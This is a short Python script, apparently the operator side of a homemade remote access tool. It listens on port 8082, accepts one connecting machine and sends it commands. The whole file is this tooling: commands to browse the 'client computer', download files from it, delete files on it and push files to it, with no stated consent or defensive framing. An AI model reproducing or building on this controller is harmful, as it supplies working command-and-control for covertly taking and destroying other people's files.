#pwd -Print working dir
#view_dir -View a specific dic
#dnload -downlaod a file
#remove_file -remove a file from client computer
import os
import socket
plus = "[+]"
minus = "[-]"
s = socket.socket()
host = socket.gethostname()
print(host)
port = 8082
s.bind((host, port))
s.listen(1)
con , addr = s.accept()
print(plus +"Conected")
print(addr, "Connected")
while(1):
    print("")
    command = input(str(plus +"Command>>> "))
    if command == "pwd":
        c = command.encode()
        con.send(c)
        print(plus +"Command send waiting for exec")
        files = con.recv(5000)
        f = files.decode()
        print("")
        print(plus +"Output:", f)
    elif command == "view_dir":
        vd = command.encode()
        con.send(vd)
        user_input = input(str("Enter Dir Name: "))
        usr_in = user_input.encode()
        con.send(usr_in)
        print("Command Has been sent")
        files = con.recv(5000)
        f = files.decode()
        print("View_Dir",f)
    elif command == "dnload":
        c = command.encode()
        con.send(c)
        print(plus +"Command send waiting for exec"+plus)
        file_path = input(str(plus +"Enter File name and file name: "))
        f = file_path.encode()
        con.send(f)
        print(plus +"File path has been sent"+plus)
        r_file = con.recv(10000)
        r_file = r_file.decode()
        file_name = input(str("Input filename with extension"))
        new_file = open(file_name , "w")
        new_file.write(r_file)
        new_file.close()
        print(plus+"File has been downloaded & saved")
    elif command =="remove_file":
        c = command.encode()
        con.send(c)
        print(plus +"Command send waiting for exec"+plus)
        file_path = input(str(plus +"Enter File Dir and file name: "))
        f = file_path.encode()
        con.send(f)
        print(plus + "Command send waiting for exec" + plus)
        msg = con.recv(5000)
        msg = msg.decode()
        print(msg)
    elif command == "view_time":
        c = command.encode()
        con.send(c)
        print(plus + "Command send waiting for exec" + plus)
        current_time = con.recv(5000)
        current_time = current_time.decode()
        print(current_time)
    elif command == "send_file":
        c = command.encode()
        con.send(c)
        file = input(str("Enter File dir and File name: "))
        file_name = input(str("Enter uploaded file name with extension: "))
        file_name = file_name.encode()
        data = open(file, "rb")
        file_data = data.read(7000)
        file_data = str(file_data)
        file_data = file_data.encode()
        print("File has been sucessfully sent")
        con.send(file_name)
        con.send(file_data)
    else:
        print("Unknown command")
